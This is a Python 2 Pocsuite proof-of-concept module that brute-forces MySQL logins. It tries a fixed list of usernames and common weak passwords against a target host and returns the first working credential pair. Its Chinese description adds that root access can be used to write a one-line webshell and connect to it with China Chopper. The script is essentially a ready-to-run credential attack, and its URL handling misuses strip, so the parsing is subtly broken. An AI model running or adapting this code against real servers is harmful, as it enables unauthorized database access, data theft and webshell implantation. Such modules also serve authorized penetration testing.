#!/usr/bin/python
# -*- coding: utf-8 -*-
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import pymysql

def mysql_pass(ip,port):
    mysql_username = ('root', 'test', 'admin', 'user')
    common_weak_password = ('802352', '123456', 'test', 'root', 'admin', 'user')
    success = False
    host = ip
    port = port
    res=[]
    for username in mysql_username:
        for password in common_weak_password:
            try:
                db = pymysql.connect(host, username, password)
                success = True
                if success:
                    res.append(username)
                    res.append(password)
                break
            except Exception, e:
                pass
        if success:
            break
    return res


def poc(url):
    if url.startswith("http://"):
        url = url.strip("http://")
    if url.endswith("/"):
        url = url.strip("/")
    if ":" in url:
        url = url.split(":")
        ip = url[0]
        port = url[1]
        response = mysql_pass(ip, port)
        return response
    else:
        ip=url
        response = mysql_pass(ip,3306)
        return response

class TestPOC(POCBase):
    name = 'mysql_weak_pass'
    vulID = '无'
    author = ['sxd']
    vulType = 'weak-pass'
    version = '1.0'  # default version: 1.0
    references = ['https://www.seebug.org/vuldb/ssvid-62522']
    desc = '''
		   MySQL 弱口令漏洞指 MySQL 数据库 root 账号对应的密码长度太短或者复杂度不够，如仅包含数字，或仅包含字母等。

弱口令容易被暴力破解，一旦被恶意利用来登录系统，会导致数据泄露，如果得到了root权限登录mysql服务，则可以写入恶意文件，危害更大，本文就是以root身份远程登录mysql服务写入了一句话木马连接了菜刀。
		   '''
    vulDate = '2020-03-27'
    createDate = '2020-03-27'
    updateDate = '2020-03-27'
    appName = 'mysql'
    appVersion = 'mysql all'
    appPowerLink = ''
    samples = ['pymysql']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        response = poc(self.url)
        print response
        if response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + ' mysql_weak_paass' + ' is exist!'
            result['AdminInfo'] = {}
            result['AdminInfo']['Username'] = response[0]
            result['AdminInfo']['Password'] = response[1]
        return self.parse_output(result)
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output
register(TestPOC)
